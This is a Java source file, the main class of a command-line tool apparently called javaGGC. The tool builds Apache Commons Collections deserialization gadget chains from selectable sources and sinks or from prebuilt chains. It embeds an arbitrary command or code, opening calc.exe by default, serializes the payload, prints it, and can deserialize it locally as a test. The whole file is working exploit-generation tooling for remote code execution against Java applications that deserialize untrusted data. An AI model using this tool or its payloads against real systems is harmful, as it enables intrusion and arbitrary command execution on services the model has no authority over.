import java.io.*;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Map;

public class Main {
    static List<Method> sourceMethodList;
    static List<Method> sinkMethodList;
    static List<Method> GGCMethodList;

    public static void usage() {
        String s = "Usage: javaGGC version=(3/4) [source=SOURCE_INDEX] [sink=SINK_INDEX] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)] \n       |\n       javaGGC 0 [ggc=CC_INDEX/CC_NAME] [arg=(command/code, 1 means default, startswith file:// means read code from file)] [test_on_local=(anyValue means yes)]\n";
        System.out.println(s);
    }

    private static void help() {
        usage();

        String s = "Generate commons.collections gadget chain.\n" +
                "    Default command / code is opening calc.exe.\n" +
                "    Set a version 0 or 3 or 4 for more information.\n";
        System.out.println(s);
        System.exit(1);
    }

    private static void usageGGC() {
        usage();
        String name;
        Method method;

        System.out.println("Available GGC:");
        for (int i = 0; i < GGCMethodList.size(); i++) {
            method = GGCMethodList.get(i);
            name = method.getName();
            if (!name.startsWith("CC")) {
                continue;
            }
            name = AppendGGCComment(name, method);

            System.out.println("  [" + i + "] " + name);
        }
        System.exit(2);
    }

    private static void usageListSourceAndSink() {
        usage();

        String name;
        System.out.println("Available Source:");
        for (int i = 0; i < sourceMethodList.size(); i++) {
            name = sourceMethodList.get(i).getName();
            if (!name.endsWith("Source")) {
                continue;
            }
            name = AppendSourceComment(name);
            System.out.println("  [" + i + "] " + name);
        }
        System.out.println("Available Sink:");
        for (int i = 0; i < sinkMethodList.size(); i++) {
            name = sinkMethodList.get(i).getName();
            if (!name.endsWith("Sink")) {
                continue;
            }
            name = AppendSinkComment(name);

            System.out.println("  [" + i + "] " + name);
        }
        System.exit(2);
    }

    private static String DealWithArg(String arg, boolean IsSinkExec) {
        if (arg.equals("1")) {
            if (IsSinkExec) {
                arg = DefaultConfig.command;
            } else {
                arg = DefaultConfig.code;
            }
        } else if (arg.startsWith("file://")) {
            arg = arg.substring(7);
            try {
                arg = readToString(arg);
            } catch (IOException e) {
                e.printStackTrace();
                System.exit(3);
            }
        }
        return arg;
    }

    private static String readToString(String fileName) throws IOException {
        String encoding = "utf-8";
        File file = new File(fileName);
        Long filelength = file.length();
        byte[] filecontent = new byte[filelength.intValue()];
        FileInputStream in = new FileInputStream(file);
        in.read(filecontent);
        in.close();
        return new String(filecontent, encoding);
    }

    private static String AppendGGCComment(String name, Method method) {
        if (method.isAnnotationPresent(SinkTypeAnnotation.class)) {
            SinkTypeAnnotation sta = method.getAnnotation(SinkTypeAnnotation.class);
            name += " (" + sta.type() + ")";
        }
        return name;
    }

    private static String AppendSourceComment(String name) {
        if (name.contains("AnnotationInvocationHandler")) {
            name += " (jdk<8u71)";
        }
        return name;
    }

    private static String AppendSinkComment(String name) {
        if (name.contains("RuntimeExec")) {
            name += " (command)";
        } else {
            name += " (code)";
        }
        return name;
    }

    public static void main(String[] args) throws Exception {
        Integer version = -1;
        Integer SourceIndex = -1;
        Integer SinkIndex = -1;
        Integer GGCIndex = -1;
        String arg = "";
        Object obj = null;
        boolean isSinkExec = false;

        if (args.length < 1) {
            help();
        }
        try {
            version = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            usage();
        }
        if (version == 3 || version == 4) {
            if (version == 3) {
                sourceMethodList = Reflections.getClassMethods(Source3.class);
                sinkMethodList = Reflections.getClassMethods(Sink3.class);
            } else {
                sourceMethodList = Reflections.getClassMethods(Source4.class);
                sinkMethodList = Reflections.getClassMethods(Sink4.class);
            }

            if (args.length < 4) {
                usageListSourceAndSink();
            }

            try {
                SourceIndex = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                System.out.println("IllegalArgumentException: source must be Integer");
                usage();
            }

            try {
                SinkIndex = Integer.parseInt(args[2]);
            } catch (NumberFormatException e) {
                System.out.println("IllegalArgumentException: sink must be Integer");
                usage();
            }


            Method SourceMethod = sourceMethodList.get(SourceIndex);
            Method SinkMethod = sinkMethodList.get(SinkIndex);

            if (SinkMethod.getName().contains("RuntimeExec")) {
                isSinkExec = true;
            }
            arg = DealWithArg(args[3], isSinkExec);

            SinkResult sinkResult = (SinkResult) SinkMethod.invoke(null, arg);
            obj = SourceMethod.invoke(null, sinkResult);

        } else if (version == 0) {
            Method GGCMethod = null;
            GGCMethodList = Reflections.getClassMethods(GGC.class);
            if (args.length < 3) {
                usageGGC();
            }
            try {
                GGCIndex = Integer.parseInt(args[1]);
                GGCMethod = GGCMethodList.get(GGCIndex);
            } catch (NumberFormatException e) {
                String GGCName = args[1];
                for (Method m : GGCMethodList) {
                    if (m.getName().equals(GGCName)) {
                        GGCMethod = m;
                        break;
                    }
                }
                if (GGCMethod == null) {
                    System.out.println("Exception: can't find this ggc");
                    System.exit(4);
                }
            }

            if (GGCMethod.isAnnotationPresent(SinkTypeAnnotation.class)) {
                SinkTypeAnnotation sta = GGCMethod.getAnnotation(SinkTypeAnnotation.class);
                if (sta.type().equals("command")) {
                    isSinkExec = true;
                }
            }
            arg = DealWithArg(args[2], isSinkExec);
            obj = GGCMethod.invoke(null, arg);
        } else {
            System.out.println("IllegalArgumentException: version must be 0 or 3 or 4");
            usage();
        }

        if (obj == null) {
            System.out.println("Exception: obj is null");
            System.exit(5);
        }

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();
        System.out.print(barr);

        if ((version == 0 && args.length == 4) || args.length == 5) {
            try {
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
                ois.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }
}
